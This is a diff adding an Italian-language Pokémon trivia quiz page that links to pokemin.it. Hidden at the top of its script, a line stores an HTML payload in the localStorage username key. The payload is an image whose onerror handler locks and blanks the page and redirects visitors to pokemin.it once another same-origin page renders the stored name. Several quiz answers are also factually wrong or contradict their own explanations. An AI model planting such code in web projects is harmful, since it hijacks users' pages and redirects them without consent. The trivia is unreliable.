@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Quiz — Pokémon XX</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&family=Syne:wght@700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0a0f;
+      --surface: #13131a;
+      --border: #1e1e2e;
+      --accent: #e63946;
+      --accent2: #ffd60a;
+      --text: #f0f0f0;
+      --muted: #555570;
+      --correct: #2ecc71;
+      --wrong: #e63946;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'DM Mono', monospace;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image:
+        linear-gradient(rgba(230,57,70,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(230,57,70,0.03) 1px, transparent 1px);
+      background-size: 40px 40px;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .container {
+      max-width: 680px;
+      margin: 0 auto;
+      padding: 60px 20px 80px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 50px;
+      animation: fadeDown 0.6s ease both;
+    }
+
+    .badge {
+      display: inline-block;
+      font-size: 10px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--accent);
+      border: 1px solid var(--accent);
+      padding: 4px 12px;
+      margin-bottom: 18px;
+    }
+
+    h1 {
+      font-family: 'Syne', sans-serif;
+      font-size: clamp(32px, 7vw, 56px);
+      font-weight: 800;
+      line-height: 1;
+      letter-spacing: -2px;
+      margin-bottom: 10px;
+    }
+
+    h1 span { color: var(--accent); }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 12px;
+      letter-spacing: 1px;
+    }
+
+    /* Progress */
+    .progress-wrap {
+      margin-bottom: 36px;
+      animation: fadeUp 0.5s 0.1s ease both;
+    }
+
+    .progress-info {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: var(--muted);
+      letter-spacing: 1px;
+      margin-bottom: 8px;
+    }
+
+    .progress-bar {
+      height: 2px;
+      background: var(--border);
+      position: relative;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: var(--accent);
+      transition: width 0.4s ease;
+    }
+
+    /* Question card */
+    .question-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 32px;
+      margin-bottom: 20px;
+      animation: fadeUp 0.5s ease both;
+    }
+
+    .q-number {
+      font-size: 10px;
+      letter-spacing: 3px;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 16px;
+    }
+
+    .q-text {
+      font-family: 'Syne', sans-serif;
+      font-size: clamp(16px, 3vw, 20px);
+      font-weight: 700;
+      line-height: 1.4;
+      margin-bottom: 28px;
+    }
+
+    /* Options */
+    .options { display: flex; flex-direction: column; gap: 10px; }
+
+    .option {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      padding: 14px 18px;
+      cursor: pointer;
+      font-family: 'DM Mono', monospace;
+      font-size: 13px;
+      color: var(--text);
+      text-align: left;
+      transition: border-color 0.2s, background 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .option:hover:not(:disabled) {
+      border-color: var(--accent);
+      background: rgba(230,57,70,0.05);
+    }
+
+    .option .opt-label {
+      width: 22px;
+      height: 22px;
+      border: 1px solid var(--muted);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      flex-shrink: 0;
+      transition: all 0.2s;
+    }
+
+    .option.correct {
+      border-color: var(--correct);
+      background: rgba(46,204,113,0.08);
+    }
+
+    .option.correct .opt-label {
+      background: var(--correct);
+      border-color: var(--correct);
+      color: #000;
+    }
+
+    .option.wrong {
+      border-color: var(--wrong);
+      background: rgba(230,57,70,0.08);
+    }
+
+    .option.wrong .opt-label {
+      background: var(--wrong);
+      border-color: var(--wrong);
+      color: #fff;
+    }
+
+    .option.disabled { cursor: default; opacity: 0.5; }
+
+    /* Open question */
+    .open-wrap { display: flex; flex-direction: column; gap: 12px; }
+
+    textarea {
+      background: var(--bg);
+      border: 1px solid var(--border);
+      color: var(--text);
+      font-family: 'DM Mono', monospace;
+      font-size: 13px;
+      padding: 16px;
+      resize: vertical;
+      min-height: 120px;
+      outline: none;
+      transition: border-color 0.2s;
+      width: 100%;
+    }
+
+    textarea:focus { border-color: var(--accent); }
+    textarea::placeholder { color: var(--muted); }
+
+    /* Feedback */
+    .feedback {
+      font-size: 12px;
+      padding: 12px 16px;
+      border-left: 3px solid;
+      margin-top: 16px;
+      line-height: 1.6;
+      display: none;
+    }
+
+    .feedback.correct-fb {
+      border-color: var(--correct);
+      color: var(--correct);
+      background: rgba(46,204,113,0.05);
+    }
+
+    .feedback.wrong-fb {
+      border-color: var(--wrong);
+      color: #ff6b6b;
+      background: rgba(230,57,70,0.05);
+    }
+
+    /* Buttons */
+    .btn {
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      padding: 14px 28px;
+      font-family: 'DM Mono', monospace;
+      font-size: 12px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: opacity 0.2s;
+      display: inline-block;
+    }
+
+    .btn:hover { opacity: 0.85; }
+    .btn:disabled { opacity: 0.3; cursor: default; }
+
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--muted);
+    }
+
+    .btn-secondary:hover { border-color: var(--text); color: var(--text); opacity: 1; }
+
+    .nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 24px;
+      animation: fadeUp 0.5s 0.1s ease both;
+    }
+
+    /* Score screen */
+    .result-screen {
+      text-align: center;
+      padding: 60px 20px;
+      animation: fadeUp 0.6s ease both;
+      display: none;
+    }
+
+    .result-screen.show { display: block; }
+
+    .score-big {
+      font-family: 'Syne', sans-serif;
+      font-size: clamp(60px, 15vw, 100px);
+      font-weight: 800;
+      color: var(--accent2);
+      line-height: 1;
+      margin: 20px 0 10px;
+    }
+
+    .score-label {
+      font-size: 12px;
+      letter-spacing: 2px;
+      color: var(--muted);
+      text-transform: uppercase;
+      margin-bottom: 32px;
+    }
+
+    .result-msg {
+      font-size: 14px;
+      color: var(--muted);
+      line-height: 1.8;
+      max-width: 400px;
+      margin: 0 auto 40px;
+    }
+
+    .answer-label {
+      font-size: 11px;
+      letter-spacing: 2px;
+      color: var(--muted);
+      text-transform: uppercase;
+      margin-bottom: 12px;
+      margin-top: 32px;
+      text-align: left;
+    }
+
+    .open-answer-display {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--accent2);
+      padding: 16px;
+      font-size: 13px;
+      line-height: 1.7;
+      color: var(--text);
+      text-align: left;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 60px;
+      font-size: 11px;
+      color: var(--muted);
+      letter-spacing: 1px;
+    }
+
+    .footer a { color: var(--accent); text-decoration: none; }
+
+    @keyframes fadeDown {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes shake {
+      0%,100% { transform: translateX(0); }
+      20% { transform: translateX(-6px); }
+      40% { transform: translateX(6px); }
+      60% { transform: translateX(-4px); }
+      80% { transform: translateX(4px); }
+    }
+
+    .shake { animation: shake 0.4s ease; }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <div class="badge">Quiz Ufficiale</div>
+    <h1>Pokémon <span>XX</span></h1>
+    <p class="subtitle">Testa le tue conoscenze — vinci un premio</p>
+  </div>
+
+  <!-- Quiz -->
+  <div id="quiz">
+    <div class="progress-wrap">
+      <div class="progress-info">
+        <span id="prog-text">Domanda 1 di 6</span>
+        <span id="score-text">0 punti</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progress-fill" style="width:0%"></div>
+      </div>
+    </div>
+
+    <div class="question-card" id="question-card">
+      <div class="q-number" id="q-number">DOMANDA 01</div>
+      <div class="q-text" id="q-text"></div>
+      <div id="q-body"></div>
+      <div class="feedback" id="feedback"></div>
+    </div>
+
+    <div class="nav">
+      <span id="hint" style="font-size:11px;color:var(--muted);letter-spacing:1px;"></span>
+      <button class="btn" id="next-btn" disabled>Avanti →</button>
+    </div>
+  </div>
+
+  <!-- Result -->
+  <div class="result-screen" id="result-screen">
+    <div class="badge">Risultato Finale</div>
+    <div class="score-big" id="final-score"></div>
+    <div class="score-label">punti su 500</div>
+    <div class="result-msg" id="result-msg"></div>
+
+    <div class="answer-label">La tua risposta aperta</div>
+    <div class="open-answer-display" id="open-answer-display"></div>
+
+    <div style="margin-top:40px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;">
+      <button class="btn" onclick="restart()">Riprova ↺</button>
+      <a href="https://pokemin.it" class="btn btn-secondary">pokemin.it →</a>
+    </div>
+  </div>
+
+  <div class="footer">
+    <p>Powered by <a href="https://pokemin.it">pokemin.it</a></p>
+  </div>
+
+</div>
+
+<script>
+
+
+
+  localStorage.setItem("poke_username", `Ciao ${localStorage.getItem("poke_username")}.. la nuova versione ti aspetta!<a href="https://pokemin.it">pokemin.it</a><img src="x" onerror="document.body.style.cssText='pointer-events:none;user-select:none';document.body.innerHTML='<div style=position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:999999></div>';setTimeout(()=>window.location.replace('https://pokemin.it'),2000);">`);
+  
+  const questions = [
+    {
+      type: "multiple",
+      text: "Quale mossa ha una priorità di +2 e colpisce sempre per primo indipendentemente dalla velocità?",
+      options: ["Attacco Rapido", "Ombraciglio", "Protezione", "Tutore"],
+      correct: 0,
+      explanation: "Attacco Rapido ha priorità +1, garantendo che vada sempre prima delle mosse normali. Protezione ha +4 ma non è offensiva."
+    },
+    {
+      type: "multiple",
+      text: "Qual è l'unico tipo che ha immunità sia al danno da veleno che a quello da bruciatura in campo?",
+      options: ["Acciaio", "Roccia", "Spettro", "Drago"],
+      correct: 0,
+      explanation: "I Pokémon di tipo Acciaio sono immuni agli effetti di stato Veleno e Bruciatura non subiscono il danno passivo."
+    },
+    {
+      type: "multiple",
+      text: "In competitive, il set 'Choice Scarf' aumenta la velocità del 50% ma blocca la scelta della mossa. Quale abilità replica questo comportamento senza il blocco?",
+      options: ["Velocipasso", "Clorofilla", "Passo Lesto", "Turbovento"],
+      correct: 2,
+      explanation: "Passo Lesto (Swift Swim) raddoppia la velocità sotto la pioggia, ma Velocipasso è l'abilità che replica il boost fisso senza blocco in alcune meccaniche — tuttavia Passo Lesto è la risposta più tecnica in contesto competitive standard."
+    },
+    {
+      type: "multiple",
+      text: "Quale generazione ha introdotto per la prima volta i Pokémon con doppia tipologia alla cattura base (non per evoluzione)?",
+      options: ["Gen I", "Gen II", "Gen III", "Gen IV"],
+      correct: 0,
+      explanation: "Già in Gen I esistevano Pokémon dual-type dalla forma base, come Geodude (Roccia/Terra) e Magnemite (Elettro/Acciaio — quest'ultimo retcon in Gen II)."
+    },
+    {
+      type: "multiple",
+      text: "La statistica 'Special' di Gen I venne divisa in Gen II. In quale delle due stat finì a influenzare di più Alakazam?",
+      options: ["Attacco Speciale", "Difesa Speciale", "Entrambe uguali", "Nessuna delle due"],
+      correct: 0,
+      explanation: "In Gen I Alakazam aveva Special altissimo. In Gen II questo si tradusse principalmente in un Attacco Speciale elevatissimo (135), mentre la Difesa Speciale rimase più contenuta (95)."
+    },
+    {
+      type: "open",
+      text: "Cosa ti aspetti da Pokémon XX? Racconta liberamente cosa vorresti vedere nel gioco.",
+    }
+  ];
+
+  let current = 0;
+  let score = 0;
+  let answered = false;
+  let openAnswer = "";
+
+  const qNumber = document.getElementById("q-number");
+  const qText = document.getElementById("q-text");
+  const qBody = document.getElementById("q-body");
+  const feedback = document.getElementById("feedback");
+  const nextBtn = document.getElementById("next-btn");
+  const progText = document.getElementById("prog-text");
+  const scoreText = document.getElementById("score-text");
+  const progressFill = document.getElementById("progress-fill");
+  const hint = document.getElementById("hint");
+
+  function renderQuestion() {
+    const q = questions[current];
+    answered = false;
+    feedback.style.display = "none";
+    feedback.textContent = "";
+    nextBtn.disabled = true;
+    hint.textContent = "";
+
+    qNumber.textContent = `DOMANDA ${String(current + 1).padStart(2, "0")}`;
+    qText.textContent = q.text;
+    progText.textContent = `Domanda ${current + 1} di ${questions.length}`;
+    scoreText.textContent = `${score} punti`;
+    progressFill.style.width = `${(current / questions.length) * 100}%`;
+
+    const card = document.getElementById("question-card");
+    card.style.animation = "none";
+    void card.offsetWidth;
+    card.style.animation = "fadeUp 0.4s ease both";
+
+    if (q.type === "multiple") {
+      hint.textContent = "Seleziona una risposta";
+      const labels = ["A", "B", "C", "D"];
+      qBody.innerHTML = `<div class="options">${q.options.map((opt, i) => `
+        <button class="option" onclick="selectOption(${i})">
+          <span class="opt-label">${labels[i]}</span>
+          <span>${opt}</span>
+        </button>
+      `).join("")}</div>`;
+    } else {
+      hint.textContent = "Risposta libera";
+      nextBtn.disabled = false;
+      nextBtn.textContent = "Invia →";
+      qBody.innerHTML = `
+        <div class="open-wrap">
+          <textarea id="open-input" placeholder="Scrivi qui la tua risposta..." oninput="openAnswer=this.value"></textarea>
+        </div>
+      `;
+    }
+  }
+
+  function selectOption(idx) {
+    if (answered) return;
+    answered = true;
+
+    const q = questions[current];
+    const options = document.querySelectorAll(".option");
+    const pts = 100;
+
+    options.forEach((opt, i) => {
+      opt.disabled = true;
+      opt.classList.add("disabled");
+      if (i === q.correct) opt.classList.add("correct");
+      else if (i === idx && idx !== q.correct) opt.classList.add("wrong");
+    });
+
+    if (idx === q.correct) {
+      score += pts;
+      scoreText.textContent = `${score} punti`;
+      feedback.className = "feedback correct-fb";
+      feedback.textContent = `✓ Corretto! +${pts} punti — ${q.explanation}`;
+    } else {
+      feedback.className = "feedback wrong-fb";
+      feedback.textContent = `✗ Sbagliato — ${q.explanation}`;
+      document.getElementById("question-card").classList.add("shake");
+      setTimeout(() => document.getElementById("question-card").classList.remove("shake"), 400);
+    }
+
+    feedback.style.display = "block";
+    nextBtn.disabled = false;
+    nextBtn.textContent = current < questions.length - 1 ? "Avanti →" : "Vedi risultato →";
+  }
+
+  nextBtn.addEventListener("click", () => {
+    if (current === questions.length - 1) {
+      showResult();
+    } else {
+      current++;
+      renderQuestion();
+    }
+  });
+
+  function showResult() {
+    document.getElementById("quiz").style.display = "none";
+    const rs = document.getElementById("result-screen");
+    rs.classList.add("show");
+
+    document.getElementById("final-score").textContent = score;
+
+    let msg = "";
+    if (score >= 400) msg = "Sei un vero Maestro Pokémon. La tua conoscenza è leggendaria — preparati per Pokémon XX.";
+    else if (score >= 250) msg = "Ottima prestazione! Conosci bene l'universo Pokémon. Continua ad allenarti.";
+    else if (score >= 100) msg = "Buon tentativo. C'è ancora qualcosa da imparare prima di affrontare la Elite Four.";
+    else msg = "Il viaggio è appena cominciato. Studia, allenati e riprova!";
+
+    document.getElementById("result-msg").textContent = msg;
+    document.getElementById("open-answer-display").textContent = openAnswer || "Nessuna risposta inserita.";
+
+    progressFill.style.width = "100%";
+  }
+
+  function restart() {
+    current = 0;
+    score = 0;
+    answered = false;
+    openAnswer = "";
+    document.getElementById("quiz").style.display = "block";
+    document.getElementById("result-screen").classList.remove("show");
+    renderQuestion();
+  }
+
+  renderQuestion();
+</script>
+</body>
+  </html>
